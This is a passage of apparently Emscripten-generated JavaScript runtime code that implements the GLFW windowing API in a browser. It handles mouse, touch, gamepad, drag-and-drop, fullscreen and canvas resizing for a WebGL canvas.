                    return;
                if (event.target != Browser.getCanvas())
                    return;
                const isTouchType = event.type === "touchstart" || event.type === "touchend" || event.type === "touchcancel";
                let eventButton = 0;
                if (isTouchType) {
                    event.preventDefault();
                    let primaryChanged = false;
                    if (GLFW.primaryTouchId === null && event.type === "touchstart" && event.targetTouches.length > 0) {
                        const chosenTouch = event.targetTouches[0];
                        GLFW.primaryTouchId = chosenTouch.identifier;
                        Browser.setMouseCoords(chosenTouch.pageX, chosenTouch.pageY);
                        primaryChanged = true
                    } else if (event.type === "touchend" || event.type === "touchcancel") {
                        for (let i of event.changedTouches) {
                            if (GLFW.primaryTouchId === i.identifier) {
                                GLFW.primaryTouchId = null;
                                primaryChanged = true;
                                break
                            }
                        }
                    }
                    if (!primaryChanged) {
                        return
                    }
                } else {
                    Browser.calculateMouseEvent(event);
                    eventButton = GLFW.DOMToGLFWMouseButton(event)
                }
                if (status == 1) {
                    GLFW.active.buttons |= 1 << eventButton;
                    try {
                        event.target.setCapture()
                    } catch (e) { }
                } else {
                    GLFW.active.buttons &= ~(1 << eventButton)
                }
                if (GLFW.active.mouseButtonFunc) {
                    ((a1, a2, a3, a4) => dynCall_viiii(GLFW.active.mouseButtonFunc, a1, a2, a3, a4))(GLFW.active.id, eventButton, status, GLFW.getModBits(GLFW.active))
                }
            }
            ,
            onMouseButtonDown: event => {
                if (!GLFW.active)
                    return;
                GLFW.onMouseButtonChanged(event, 1)
            }
            ,
            onMouseButtonUp: event => {
                if (!GLFW.active)
                    return;
                GLFW.onMouseButtonChanged(event, 0)
            }
            ,
            onMouseWheel: event => {
                var delta = -Browser.getMouseWheelDelta(event);
                delta = delta == 0 ? 0 : delta > 0 ? Math.max(delta, 1) : Math.min(delta, -1);
                GLFW.wheelPos += delta;
                if (!GLFW.active || !GLFW.active.scrollFunc || event.target != Browser.getCanvas())
                    return;
                var sx = 0;
                var sy = delta;
                if (event.type == "mousewheel") {
                    sx = event.wheelDeltaX
                } else {
                    sx = event.deltaX
                }
                ((a1, a2, a3) => dynCall_vidd(GLFW.active.scrollFunc, a1, a2, a3))(GLFW.active.id, sx, sy);
                event.preventDefault()
            }
            ,
            onCanvasResize: (width, height, framebufferWidth, framebufferHeight) => {
                if (!GLFW.active)
                    return;
                var resizeNeeded = false;
                if (getFullscreenElement()) {
                    if (!GLFW.active.fullscreen) {
                        resizeNeeded = width != screen.width || height != screen.height;
                        GLFW.active.storedX = GLFW.active.x;
                        GLFW.active.storedY = GLFW.active.y;
                        GLFW.active.storedWidth = GLFW.active.width;
                        GLFW.active.storedHeight = GLFW.active.height;
                        GLFW.active.x = GLFW.active.y = 0;
                        GLFW.active.width = screen.width;
                        GLFW.active.height = screen.height;
                        GLFW.active.fullscreen = true
                    }
                } else if (GLFW.active.fullscreen == true) {
                    resizeNeeded = width != GLFW.active.storedWidth || height != GLFW.active.storedHeight;
                    GLFW.active.x = GLFW.active.storedX;
                    GLFW.active.y = GLFW.active.storedY;
                    GLFW.active.width = GLFW.active.storedWidth;
                    GLFW.active.height = GLFW.active.storedHeight;
                    GLFW.active.fullscreen = false
                }
                if (resizeNeeded) {
                    Browser.setCanvasSize(GLFW.active.width, GLFW.active.height)
                } else if (GLFW.active.width != width || GLFW.active.height != height || GLFW.active.framebufferWidth != framebufferWidth || GLFW.active.framebufferHeight != framebufferHeight) {
                    GLFW.active.width = width;
                    GLFW.active.height = height;
                    GLFW.active.framebufferWidth = framebufferWidth;
                    GLFW.active.framebufferHeight = framebufferHeight;
                    GLFW.onWindowSizeChanged();
                    GLFW.onFramebufferSizeChanged()
                }
            }
            ,
            onWindowSizeChanged: () => {
                if (!GLFW.active)
                    return;
                if (GLFW.active.windowSizeFunc) {
                    ((a1, a2, a3) => dynCall_viii(GLFW.active.windowSizeFunc, a1, a2, a3))(GLFW.active.id, GLFW.active.width, GLFW.active.height)
                }
            }
            ,
            onFramebufferSizeChanged: () => {
                if (!GLFW.active)
                    return;
                if (GLFW.active.framebufferSizeFunc) {
                    ((a1, a2, a3) => dynCall_viii(GLFW.active.framebufferSizeFunc, a1, a2, a3))(GLFW.active.id, GLFW.active.framebufferWidth, GLFW.active.framebufferHeight)
                }
            }
            ,
            onWindowContentScaleChanged: scale => {
                GLFW.scale = scale;
                if (!GLFW.active)
                    return;
                if (GLFW.active.windowContentScaleFunc) {
                    ((a1, a2, a3) => dynCall_viff(GLFW.active.windowContentScaleFunc, a1, a2, a3))(GLFW.active.id, GLFW.scale, GLFW.scale)
                }
            }
            ,
            getTime: () => _emscripten_get_now() / 1e3,
            setWindowTitle: (winid, title) => {
                var win = GLFW.WindowFromId(winid);
                if (!win)
                    return;
                win.title = title;
                if (GLFW.active.id == win.id) {
                    _emscripten_set_window_title(title)
                }
            }
            ,
            setJoystickCallback: cbfun => {
                var prevcbfun = GLFW.joystickFunc;
                GLFW.joystickFunc = cbfun;
                GLFW.refreshJoysticks();
                return prevcbfun
            }
            ,
            joys: {},
            lastGamepadState: [],
            lastGamepadStateFrame: null,
            refreshJoysticks: () => {
                if (MainLoop.currentFrameNumber !== GLFW.lastGamepadStateFrame || !MainLoop.currentFrameNumber) {
                    GLFW.lastGamepadState = navigator.getGamepads ? navigator.getGamepads() : navigator.webkitGetGamepads || [];
                    GLFW.lastGamepadStateFrame = MainLoop.currentFrameNumber;
                    for (var joy = 0; joy < GLFW.lastGamepadState.length; ++joy) {
                        var gamepad = GLFW.lastGamepadState[joy];
                        if (gamepad) {
                            if (!GLFW.joys[joy]) {
                                out("glfw joystick connected:", joy);
                                GLFW.joys[joy] = {
                                    id: stringToNewUTF8(gamepad.id),
                                    buttonsCount: gamepad.buttons.length,
                                    axesCount: gamepad.axes.length,
                                    buttons: _malloc(gamepad.buttons.length),
                                    axes: _malloc(gamepad.axes.length * 4)
                                };
                                if (GLFW.joystickFunc) {
                                    ((a1, a2) => dynCall_vii(GLFW.joystickFunc, a1, a2))(joy, 262145)
                                }
                            }
                            var data = GLFW.joys[joy];
                            for (var i = 0; i < gamepad.buttons.length; ++i) {
                                HEAP8[data.buttons + i] = gamepad.buttons[i].pressed
                            }
                            for (var i = 0; i < gamepad.axes.length; ++i) {
                                HEAPF32[data.axes + i * 4 >> 2] = gamepad.axes[i]
                            }
                        } else {
                            if (GLFW.joys[joy]) {
                                out("glfw joystick disconnected", joy);
                                if (GLFW.joystickFunc) {
                                    ((a1, a2) => dynCall_vii(GLFW.joystickFunc, a1, a2))(joy, 262146)
                                }
                                _free(GLFW.joys[joy].id);
                                _free(GLFW.joys[joy].buttons);
                                _free(GLFW.joys[joy].axes);
                                delete GLFW.joys[joy]
                            }
                        }
                    }
                }
            }
            ,
            setKeyCallback: (winid, cbfun) => {
                var win = GLFW.WindowFromId(winid);
                if (!win)
                    return null;
                var prevcbfun = win.keyFunc;
                win.keyFunc = cbfun;
                return prevcbfun
            }
            ,
            setCharCallback: (winid, cbfun) => {
                var win = GLFW.WindowFromId(winid);
                if (!win)
                    return null;
                var prevcbfun = win.charFunc;
                win.charFunc = cbfun;
                return prevcbfun
            }
            ,
            setMouseButtonCallback: (winid, cbfun) => {
                var win = GLFW.WindowFromId(winid);
                if (!win)
                    return null;
                var prevcbfun = win.mouseButtonFunc;
                win.mouseButtonFunc = cbfun;
                return prevcbfun
            }
            ,
            setCursorPosCallback: (winid, cbfun) => {
                var win = GLFW.WindowFromId(winid);
                if (!win)
                    return null;
                var prevcbfun = win.cursorPosFunc;
                win.cursorPosFunc = cbfun;
                return prevcbfun
            }
            ,
            setScrollCallback: (winid, cbfun) => {
                var win = GLFW.WindowFromId(winid);
                if (!win)
                    return null;
                var prevcbfun = win.scrollFunc;
                win.scrollFunc = cbfun;
                return prevcbfun
            }
            ,
            setDropCallback: (winid, cbfun) => {
                var win = GLFW.WindowFromId(winid);
                if (!win)
                    return null;
                var prevcbfun = win.dropFunc;
                win.dropFunc = cbfun;
                return prevcbfun
            }
            ,
            onDrop: event => {
                if (!GLFW.active || !GLFW.active.dropFunc)
                    return;
                if (!event.dataTransfer || !event.dataTransfer.files || event.dataTransfer.files.length == 0)
                    return;
                event.preventDefault();
                var drop_dir = ".glfw_dropped_files";
                var filenames = _malloc(event.dataTransfer.files.length * 4);
                var filenamesArray = [];
                for (var i = 0; i < event.dataTransfer.files.length; ++i) {
                    var path = `/${drop_dir}/${event.dataTransfer.files[i].name.replace(/\//g, "_")}`;
                    var filename = stringToNewUTF8(path);
                    filenamesArray.push(filename);
                    HEAPU32[filenames + i * 4 >> 2] = filename
                }
                var written = 0;
                FS.createPath("/", drop_dir);
                function save(file, in_path, numfiles) {
                    var path = "/" + drop_dir + in_path + "/" + file.name.replace(/\//g, "_");
                    var reader = new FileReader;
                    reader.onloadend = e => {
                        if (reader.readyState != 2) {
                            ++written;
                            err(`failed to read dropped file: ${in_path}/${file.name}: ${reader.error}`);
                            return
                        }
                        var data = e.target.result;
                        FS.writeFile(path, new Uint8Array(data));
                        if (++written === numfiles) {
                            ((a1, a2, a3) => dynCall_viii(GLFW.active.dropFunc, a1, a2, a3))(GLFW.active.id, filenamesArray.length, filenames);
                            for (var i = 0; i < filenamesArray.length; ++i) {
                                _free(filenamesArray[i])
                            }
                            _free(filenames)
                        }
                    }
                        ;
                    reader.readAsArrayBuffer(file)
                }
                let filesQ = [];
                function finalize() {
                    var count = filesQ.length;
                    for (var i = 0; i < count; ++i) {
                        save(filesQ[i].file, filesQ[i].path, count)
                    }
                }
                if (DataTransferItem.prototype.webkitGetAsEntry) {
                    let entriesTree = {};
                    function markDone(fullpath, recursive) {
                        if (entriesTree[fullpath].subpaths.length != 0)
                            return;
                        delete entriesTree[fullpath];
                        let parentpath = fullpath.substring(0, fullpath.lastIndexOf("/"));
                        if (!entriesTree.hasOwnProperty(parentpath)) {
                            if (Object.keys(entriesTree).length == 0)
                                finalize();
                            return
                        }
                        const fpIndex = entriesTree[parentpath].subpaths.indexOf(fullpath);
                        if (fpIndex > -1)
                            entriesTree[parentpath].subpaths.splice(fpIndex, 1);
                        if (recursive)
                            markDone(parentpath, true);
                        if (Object.keys(entriesTree).length == 0)
                            finalize()
                    }
                    function processEntry(entry) {
                        let fp = entry.fullPath;
                        let pp = fp.substring(0, fp.lastIndexOf("/"));
                        entriesTree[fp] = {
                            subpaths: []
                        };
                        if (entry.isFile) {
                            entry.file(f => {
                                filesQ.push({
                                    file: f,
                                    path: pp
                                });
                                markDone(fp, false)
                            }
                            )
                        } else if (entry.isDirectory) {
                            if (entriesTree.hasOwnProperty(pp))
                                entriesTree[pp].subpaths.push(fp);
                            FS.createPath("/" + drop_dir + pp, entry.name);
                            var reader = entry.createReader();
                            var rRead = function (dirEntries) {
                                if (dirEntries.length == 0) {
                                    markDone(fp, true);
                                    return
                                }
                                for (const ent of dirEntries)
                                    processEntry(ent);
                                reader.readEntries(rRead)
                            };
                            reader.readEntries(rRead)
                        }
                    }
                    for (const item of event.dataTransfer.items) {
                        processEntry(item.webkitGetAsEntry())
                    }
                } else {
                    for (const file of event.dataTransfer.files) {
                        filesQ.push({
                            file,
                            path: ""
                        })
                    }
                    finalize()
                }
                return false
            }
            ,
            onDragover: event => {
                if (!GLFW.active || !GLFW.active.dropFunc)
                    return;
                event.preventDefault();
                return false
            }
            ,
            setWindowSizeCallback: (winid, cbfun) => {
                var win = GLFW.WindowFromId(winid);
                if (!win)
                    return null;
                var prevcbfun = win.windowSizeFunc;
                win.windowSizeFunc = cbfun;
                return prevcbfun
            }
            ,
            setWindowCloseCallback: (winid, cbfun) => {
                var win = GLFW.WindowFromId(winid);
                if (!win)
                    return null;
                var prevcbfun = win.windowCloseFunc;
                win.windowCloseFunc = cbfun;
                return prevcbfun
            }
            ,
            setWindowRefreshCallback: (winid, cbfun) => {
                var win = GLFW.WindowFromId(winid);
                if (!win)
                    return null;
                var prevcbfun = win.windowRefreshFunc;
                win.windowRefreshFunc = cbfun;
                return prevcbfun
            }
            ,
            onClickRequestPointerLock: e => {
                var canvas = Browser.getCanvas();
                if (!Browser.pointerLock && canvas.requestPointerLock) {
                    canvas.requestPointerLock();
                    e.preventDefault()
                }
            }
            ,
            setInputMode: (winid, mode, value) => {
                var win = GLFW.WindowFromId(winid);
                if (!win)
                    return;
                switch (mode) {
                    case 208897:
                        {
                            var canvas = Browser.getCanvas();
                            switch (value) {
                                case 212993:
                                    {
                                        win.inputModes[mode] = value;
                                        canvas.removeEventListener("click", GLFW.onClickRequestPointerLock, true);
                                        document.exitPointerLock();
                                        break
                                    }
                                case 212994:
                                    {
                                        err("glfwSetInputMode called with GLFW_CURSOR_HIDDEN value not implemented");
                                        break
                                    }
                                case 212995:
                                    {
                                        win.inputModes[mode] = value;
                                        canvas.addEventListener("click", GLFW.onClickRequestPointerLock, true);
                                        canvas.requestPointerLock();
                                        break
                                    }
                                default:
                                    {
                                        err(`glfwSetInputMode called with unknown value parameter value: ${value}`);
                                        break
                                    }
                            }
                            break
                        }
                    case 208898:
                        {
                            err("glfwSetInputMode called with GLFW_STICKY_KEYS mode not implemented");
                            break
                        }
                    case 208899:
                        {
                            err("glfwSetInputMode called with GLFW_STICKY_MOUSE_BUTTONS mode not implemented");
                            break
                        }
                    case 208900:
                        {
                            err("glfwSetInputMode called with GLFW_LOCK_KEY_MODS mode not implemented");
                            break
                        }
                    case 208901:
                        {
                            err("glfwSetInputMode called with GLFW_RAW_MOUSE_MOTION mode not implemented");
                            break
                        }
                    default:
                        {
                            err(`glfwSetInputMode called with unknown mode parameter value: ${mode}`);
                            break
                        }
                }
            }
            ,
            getKey: (winid, key) => {
                var win = GLFW.WindowFromId(winid);
                if (!win)
                    return 0;
                return win.keys[key]
            }
            ,
            getMouseButton: (winid, button) => {
                var win = GLFW.WindowFromId(winid);
                if (!win)
                    return 0;
                return (win.buttons & 1 << button) > 0
            }
            ,
            getCursorPos: (winid, x, y) => {
                HEAPF64[x >> 3] = Browser.mouseX;
                HEAPF64[y >> 3] = Browser.mouseY
            }
            ,
            getMousePos: (winid, x, y) => {
                HEAP32[x >> 2] = Browser.mouseX;
                HEAP32[y >> 2] = Browser.mouseY
            }
            ,
            setCursorPos: (winid, x, y) => { }
            ,
            getWindowPos: (winid, x, y) => {
                var wx = 0;
                var wy = 0;
                var win = GLFW.WindowFromId(winid);
                if (win) {
                    wx = win.x;
                    wy = win.y
                }
                if (x) {
                    HEAP32[x >> 2] = wx
                }
                if (y) {
                    HEAP32[y >> 2] = wy
                }
            }
            ,
            setWindowPos: (winid, x, y) => {
                var win = GLFW.WindowFromId(winid);
                if (!win)
                    return;
                win.x = x;
                win.y = y
            }
            ,
            getWindowSize: (winid, width, height) => {
                var ww = 0;
                var wh = 0;
                var win = GLFW.WindowFromId(winid);
                if (win) {
                    ww = win.width;
                    wh = win.height
                }
                if (width) {
                    HEAP32[width >> 2] = ww
                }
                if (height) {
                    HEAP32[height >> 2] = wh
                }
            }
            ,
            setWindowSize: (winid, width, height) => {
                var win = GLFW.WindowFromId(winid);
                if (!win)
                    return;
                if (GLFW.active.id == win.id) {
                    Browser.setCanvasSize(width, height)
                }
            }
            ,
            defaultWindowHints: () => {
                GLFW.hints = {
                    ...GLFW.defaultHints
                }
            }
            ,
            createWindow: (width, height, title, monitor, share) => {
                var i, id;
                for (i = 0; i < GLFW.windows.length && GLFW.windows[i] !== null; i++) { }
                if (i > 0)
                    abort("glfwCreateWindow only supports one window at time currently");
                id = i + 1;
                if (width <= 0 || height <= 0)
                    return 0;
                if (monitor) {
                    Browser.requestFullscreen()
                } else {
                    Browser.setCanvasSize(width, height)
                }
                for (i = 0; i < GLFW.windows.length && GLFW.windows[i] == null; i++) { }
                const canvas = Browser.getCanvas();
                var useWebGL = GLFW.hints[139265] > 0;
                if (i == GLFW.windows.length) {
                    if (useWebGL) {
                        var contextAttributes = {
                            antialias: GLFW.hints[135181] > 1,
                            depth: GLFW.hints[135173] > 0,
                            stencil: GLFW.hints[135174] > 0,
                            alpha: GLFW.hints[135172] > 0
                        };
                        Browser.createContext(canvas, true, true, contextAttributes)
                    } else {
                        Browser.init()
                    }
                }
                if (!Module["ctx"] && useWebGL)
                    return 0;
                var win = new GLFW_Window(id, width, height, canvas.width, canvas.height, title, monitor, share);
                if (id - 1 == GLFW.windows.length) {
                    GLFW.windows.push(win)
                } else {
                    GLFW.windows[id - 1] = win
                }
                GLFW.active = win;
                GLFW.adjustCanvasDimensions();
                return win.id
            }
            ,
            destroyWindow: winid => {
                var win = GLFW.WindowFromId(winid);
                if (!win)
                    return;
                if (win.windowCloseFunc) {
                    (a1 => dynCall_vi(win.windowCloseFunc, a1))(win.id)
                }
                GLFW.windows[win.id - 1] = null;
                if (GLFW.active.id == win.id) {
                    GLFW.active = null
                }
                for (win of GLFW.windows) {
                    if (win !== null)
                        return
                }
                delete Module["ctx"]
            }
            ,
            swapBuffers: winid => { }
            ,
            requestFullscreen(lockPointer, resizeCanvas) {
                Browser.lockPointer = lockPointer;
                Browser.resizeCanvas = resizeCanvas;
                if (typeof Browser.lockPointer == "undefined")
                    Browser.lockPointer = true;
                if (typeof Browser.resizeCanvas == "undefined")
                    Browser.resizeCanvas = false;
                var canvas = Browser.getCanvas();
                function fullscreenChange() {
                    Browser.isFullscreen = false;
                    var canvasContainer = canvas.parentNode;
                    if (getFullscreenElement() === canvasContainer) {
                        canvas.exitFullscreen = Browser.exitFullscreen;
                        if (Browser.lockPointer)
                            canvas.requestPointerLock();
                        Browser.isFullscreen = true;
                        if (Browser.resizeCanvas) {
                            Browser.setFullscreenCanvasSize()
                        } else {
                            Browser.updateCanvasDimensions(canvas);
                            Browser.updateResizeListeners()
                        }
                    } else {
                        canvasContainer.parentNode.insertBefore(canvas, canvasContainer);
                        canvasContainer.parentNode.removeChild(canvasContainer);
                        if (Browser.resizeCanvas) {
                            Browser.setWindowedCanvasSize()
                        } else {
                            Browser.updateCanvasDimensions(canvas);
                            Browser.updateResizeListeners()
                        }
                    }
                    Module["onFullScreen"]?.(Browser.isFullscreen);
                    Module["onFullscreen"]?.(Browser.isFullscreen)
                }
                if (!Browser.fullscreenHandlersInstalled) {
                    Browser.fullscreenHandlersInstalled = true;
                    document.addEventListener("fullscreenchange", fullscreenChange, false);
                    document.addEventListener("mozfullscreenchange", fullscreenChange, false);
                    document.addEventListener("webkitfullscreenchange", fullscreenChange, false);
                    document.addEventListener("MSFullscreenChange", fullscreenChange, false)
                }
                var canvasContainer = document.createElement("div");
                canvas.parentNode.insertBefore(canvasContainer, canvas);
                canvasContainer.appendChild(canvas);
                canvasContainer.requestFullscreen = canvasContainer["requestFullscreen"] || canvasContainer["mozRequestFullScreen"] || canvasContainer["msRequestFullscreen"] || (canvasContainer["webkitRequestFullscreen"] ? () => canvasContainer["webkitRequestFullscreen"](Element["ALLOW_KEYBOARD_INPUT"]) : null) || (canvasContainer["webkitRequestFullScreen"] ? () => canvasContainer["webkitRequestFullScreen"](Element["ALLOW_KEYBOARD_INPUT"]) : null);
                canvasContainer.requestFullscreen()
            },
            updateCanvasDimensions(canvas, wNative, hNative) {
                const scale = GLFW.getHiDPIScale();
                if (wNative && hNative) {
                    canvas.widthNative = wNative;
                    canvas.heightNative = hNative
                } else {
                    wNative = canvas.widthNative;
                    hNative = canvas.heightNative
                }
                var w = wNative;
                var h = hNative;
                if (Module["forcedAspectRatio"] && Module["forcedAspectRatio"] > 0) {
                    if (w / h < Module["forcedAspectRatio"]) {
                        w = Math.round(h * Module["forcedAspectRatio"])
                    } else {
                        h = Math.round(w / Module["forcedAspectRatio"])
                    }
                }
                if (getFullscreenElement() === canvas.parentNode && typeof screen != "undefined") {
                    var factor = Math.min(screen.width / w, screen.height / h);
                    w = Math.round(w * factor);
                    h = Math.round(h * factor)
                }
                if (Browser.resizeCanvas) {
                    wNative = w;
                    hNative = h
                }
                const wNativeScaled = Math.floor(wNative * scale);
                const hNativeScaled = Math.floor(hNative * scale);
                if (canvas.width != wNativeScaled)
                    canvas.width = wNativeScaled;
                if (canvas.height != hNativeScaled)
                    canvas.height = hNativeScaled;
                if (typeof canvas.style != "undefined") {
                    if (!GLFW.isCSSScalingEnabled()) {
                        canvas.style.setProperty("width", wNative + "px", "important");
                        canvas.style.setProperty("height", hNative + "px", "important")
                    } else {
                        canvas.style.removeProperty("width");
                        canvas.style.removeProperty("height")
                    }
                }
            },
            calculateMouseCoords(pageX, pageY) {
                const rect = Browser.getCanvas().getBoundingClientRect();
                var scrollX = typeof window.scrollX != "undefined" ? window.scrollX : window.pageXOffset;
                var scrollY = typeof window.scrollY != "undefined" ? window.scrollY : window.pageYOffset;
                var adjustedX = pageX - (scrollX + rect.left);
                var adjustedY = pageY - (scrollY + rect.top);
                if (GLFW.isCSSScalingEnabled() && GLFW.active) {
                    adjustedX = adjustedX * (GLFW.active.width / rect.width);
                    adjustedY = adjustedY * (GLFW.active.height / rect.height)
                }
                return {
                    x: adjustedX,
                    y: adjustedY
                }
            },
            setWindowAttrib: (winid, attrib, value) => {
                var win = GLFW.WindowFromId(winid);
                if (!win)
                    return;
                const isHiDPIAware = GLFW.isHiDPIAware();
                win.attributes[attrib] = value;
                if (isHiDPIAware !== GLFW.isHiDPIAware())
                    GLFW.adjustCanvasDimensions()
            }
            ,
            getDevicePixelRatio() {
                return typeof devicePixelRatio == "number" && devicePixelRatio || 1
            },
            isHiDPIAware() {
                if (GLFW.active)
                    return GLFW.active.attributes[139276] > 0;
                else
                    return false
            },
            isCSSScalingEnabled() {
                return !GLFW.isHiDPIAware()
            },
            adjustCanvasDimensions() {
                if (GLFW.active) {
                    Browser.updateCanvasDimensions(Browser.getCanvas(), GLFW.active.width, GLFW.active.height);
                    Browser.updateResizeListeners()
                }
            },
            getHiDPIScale() {
                return GLFW.isHiDPIAware() ? GLFW.scale : 1
            },
            onDevicePixelRatioChange() {
                GLFW.onWindowContentScaleChanged(GLFW.getDevicePixelRatio());
                GLFW.adjustCanvasDimensions()
            },
            GLFW2ParamToGLFW3Param: param => {
                var table = {
                    196609: 0,
                    196610: 0,
                    196611: 0,
                    196612: 0,
                    196613: 0,
                    196614: 0,
                    131073: 0,
                    131074: 0,
                    131075: 0,
                    131076: 0,
                    131077: 135169,
                    131078: 135170,
                    131079: 135171,
                    131080: 135172,
                    131081: 135173,
                    131082: 135174,
                    131083: 135183,
                    131084: 135175,
                    131085: 135176,
                    131086: 135177,
                    131087: 135178,
                    131088: 135179,
                    131089: 135180,
                    131090: 0,
                    131091: 135181,
                    131092: 139266,
                    131093: 139267,
                    131094: 139270,
                    131095: 139271,
                    131096: 139272
                };
                return table[param]
            }
        };
        var _glfwCreateWindow = (width, height, title, monitor, share) => GLFW.createWindow(width, height, title, monitor, share);
        var _glfwDestroyWindow = winid => GLFW.destroyWindow(winid);
        var _glfwGetCursorPos = (winid, x, y) => GLFW.getCursorPos(winid, x, y);
        var _glfwGetFramebufferSize = (winid, width, height) => {
            var ww = 0;
            var wh = 0;
            var win = GLFW.WindowFromId(winid);
            if (win) {
                ww = win.framebufferWidth;
                wh = win.framebufferHeight
            }
            if (width) {
                HEAP32[width >> 2] = ww
            }
            if (height) {
                HEAP32[height >> 2] = wh
            }
        }
            ;
        var _glfwGetInputMode = (winid, mode) => {
            var win = GLFW.WindowFromId(winid);
            if (!win)
                return;
            switch (mode) {
                case 208897:
                    {
                        if (Browser.pointerLock) {
                            win.inputModes[mode] = 212995
                        } else {
                            win.inputModes[mode] = 212993
                        }
                    }
            }
            return win.inputModes[mode]
        }
            ;
        var _glfwGetMonitorName = mon => {
            GLFW.monitorString ||= stringToNewUTF8("HTML5 WebGL Canvas");
            return GLFW.monitorString
        }
            ;
        var _glfwGetMonitors = count => {
            HEAP32[count >> 2] = 1;
            if (!GLFW.monitors) {
                GLFW.monitors = _malloc(4);
                HEAP32[GLFW.monitors >> 2] = 1
            }
            return GLFW.monitors
        }
            ;
        var _glfwGetMouseButton = (winid, button) => GLFW.getMouseButton(winid, button);
        var _glfwGetVideoMode = monitor => 0;
        var _glfwGetVideoModes = (monitor, count) => {
            HEAP32[count >> 2] = 0;
            return 0
        }
            ;
        var _glfwGetWindowSize = (winid, width, height) => GLFW.getWindowSize(winid, width, height);
        var _glfwInit = () => {
            if (GLFW.windows)
                return 1;
            GLFW.initialTime = GLFW.getTime();
            GLFW.defaultWindowHints();
            GLFW.windows = new Array;
            GLFW.active = null;
            GLFW.scale = GLFW.getDevicePixelRatio();
            window.addEventListener("gamepadconnected", GLFW.onGamepadConnected, true);
            window.addEventListener("gamepaddisconnected", GLFW.onGamepadDisconnected, true);
            window.addEventListener("keydown", GLFW.onKeydown, true);
            window.addEventListener("keypress", GLFW.onKeyPress, true);
            window.addEventListener("keyup", GLFW.onKeyup, true);
            window.addEventListener("blur", GLFW.onBlur, true);
            GLFW.devicePixelRatioMQL = window.matchMedia("(resolution: " + GLFW.getDevicePixelRatio() + "dppx)");
            GLFW.devicePixelRatioMQL.addEventListener("change", GLFW.onDevicePixelRatioChange);
            var canvas = Browser.getCanvas();
            canvas.addEventListener("touchmove", GLFW.onMousemove, true);
            canvas.addEventListener("touchstart", GLFW.onMouseButtonDown, true);
            canvas.addEventListener("touchcancel", GLFW.onMouseButtonUp, true);
            canvas.addEventListener("touchend", GLFW.onMouseButtonUp, true);
            canvas.addEventListener("mousemove", GLFW.onMousemove, true);
            canvas.addEventListener("mousedown", GLFW.onMouseButtonDown, true);
            canvas.addEventListener("mouseup", GLFW.onMouseButtonUp, true);
            canvas.addEventListener("wheel", GLFW.onMouseWheel, true);
            canvas.addEventListener("mousewheel", GLFW.onMouseWheel, true);
            canvas.addEventListener("mouseenter", GLFW.onMouseenter, true);
            canvas.addEventListener("mouseleave", GLFW.onMouseleave, true);
            canvas.addEventListener("drop", GLFW.onDrop, true);
            canvas.addEventListener("dragover", GLFW.onDragover, true);
            Browser.requestFullscreen = GLFW.requestFullscreen;
            Browser.calculateMouseCoords = GLFW.calculateMouseCoords;
            Browser.updateCanvasDimensions = GLFW.updateCanvasDimensions;
            Browser.resizeListeners.push((width, height) => {
                if (GLFW.isHiDPIAware()) {
                    var canvas = Browser.getCanvas();
                    GLFW.onCanvasResize(canvas.clientWidth, canvas.clientHeight, width, height)
                } else {
                    GLFW.onCanvasResize(width, height, width, height)
                }
            }
            );
            return 1
        }
            ;
        var _glfwMakeContextCurrent = winid => 0;
        var _glfwPollEvents = () => 0;
        var _glfwSetCursorEnterCallback = (winid, cbfun) => {
            var win = GLFW.WindowFromId(winid);
            if (!win)
                return null;
            var prevcbfun = win.cursorEnterFunc;
            win.cursorEnterFunc = cbfun;
            return prevcbfun
        }
            ;
        var _glfwSetCursorPos = (winid, x, y) => GLFW.setCursorPos(winid, x, y);
        var _glfwSetCursorPosCallback = (winid, cbfun) => GLFW.setCursorPosCallback(winid, cbfun);
        var _glfwSetErrorCallback = cbfun => {
            var prevcbfun = GLFW.errorFunc;
            GLFW.errorFunc = cbfun;
            return prevcbfun
        }
            ;
        var _glfwSetFramebufferSizeCallback = (winid, cbfun) => {
            var win = GLFW.WindowFromId(winid);
            if (!win)
                return null;
            var prevcbfun = win.framebufferSizeFunc;
            win.framebufferSizeFunc = cbfun;
            return prevcbfun
        }
            ;
        var _glfwSetInputMode = (winid, mode, value) => {
            GLFW.setInputMode(winid, mode, value)
        }
            ;
        var _glfwSetKeyCallback = (winid, cbfun) => GLFW.setKeyCallback(winid, cbfun);
        var _glfwSetScrollCallback = (winid, cbfun) => GLFW.setScrollCallback(winid, cbfun);
        var _glfwSetWindowFocusCallback = (winid, cbfun) => {
            var win = GLFW.WindowFromId(winid);
            if (!win)
                return null;
            var prevcbfun = win.windowFocusFunc;
            win.windowFocusFunc = cbfun;
            return prevcbfun
        }
            ;
        var _glfwSetWindowIconifyCallback = (winid, cbfun) => {
            var win = GLFW.WindowFromId(winid);
            if (!win)
                return null;
            var prevcbfun = win.windowIconifyFunc;
            win.windowIconifyFunc = cbfun;
            return prevcbfun
        }
            ;
        var _glfwSetWindowSize = (winid, width, height) => GLFW.setWindowSize(winid, width, height);
        var _glfwSwapBuffers = winid => GLFW.swapBuffers(winid);
        var _glfwSwapInterval = interval => {
            interval = Math.abs(interval);
            if (interval == 0)
                _emscripten_set_main_loop_timing(0, 0);
            else
                _emscripten_set_main_loop_timing(1, interval)
        }
            ;
        var _glfwTerminate = () => {
            window.removeEventListener("gamepadconnected", GLFW.onGamepadConnected, true);
            window.removeEventListener("gamepaddisconnected", GLFW.onGamepadDisconnected, true);
            window.removeEventListener("keydown", GLFW.onKeydown, true);
            window.removeEventListener("keypress", GLFW.onKeyPress, true);
            window.removeEventListener("keyup", GLFW.onKeyup, true);
            window.removeEventListener("blur", GLFW.onBlur, true);
            var canvas = Browser.getCanvas();
            canvas.removeEventListener("touchmove", GLFW.onMousemove, true);
            canvas.removeEventListener("touchstart", GLFW.onMouseButtonDown, true);
            canvas.removeEventListener("touchcancel", GLFW.onMouseButtonUp, true);
            canvas.removeEventListener("touchend", GLFW.onMouseButtonUp, true);
            canvas.removeEventListener("mousemove", GLFW.onMousemove, true);
            canvas.removeEventListener("mousedown", GLFW.onMouseButtonDown, true);
            canvas.removeEventListener("mouseup", GLFW.onMouseButtonUp, true);
            canvas.removeEventListener("wheel", GLFW.onMouseWheel, true);
            canvas.removeEventListener("mousewheel", GLFW.onMouseWheel, true);
            canvas.removeEventListener("mouseenter", GLFW.onMouseenter, true);
            canvas.removeEventListener("mouseleave", GLFW.onMouseleave, true);
            canvas.removeEventListener("drop", GLFW.onDrop, true);
            canvas.removeEventListener("dragover", GLFW.onDragover, true);
            if (GLFW.devicePixelRatioMQL)
                GLFW.devicePixelRatioMQL.removeEventListener("change", GLFW.onDevicePixelRatioChange);
            canvas.width = canvas.height = 1;
            GLFW.windows = null;
